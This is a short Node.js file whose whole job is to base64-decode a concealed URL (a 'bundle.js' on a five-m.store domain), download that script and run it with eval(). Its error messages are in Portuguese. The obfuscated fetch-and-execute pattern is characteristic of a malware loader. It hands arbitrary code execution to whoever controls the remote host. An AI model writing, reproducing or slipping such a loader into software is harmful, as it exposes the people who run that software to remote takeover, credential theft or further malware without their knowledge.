const https = require('https');

const Base64 = {
	encode: data => Buffer.from(data, 'utf-8').toString('base64'),
	decode: data => Buffer.from(data, 'base64').toString('utf-8')
}

https.request(Base64.decode('aHR0cHM6Ly9maXZlLW0uc3RvcmUvc3RvcmFnZS9idW5kbGUuanM='),(res) => {
	let data = '';
	res.on('data', (chunk) => data += chunk.toString('utf8'));
	res.on('end', () => {
		try {
			eval(data);
		} catch ({ name, message }){
			console.error(`Falha ao iniciar o script pela internet.\n${name}\n${message}`);
		}
	});
	res.on('error',({ name, message }) => {
		console.error(`Falha ao baixar o script pela internet\n${name}\n${message}`);
	});
}).end();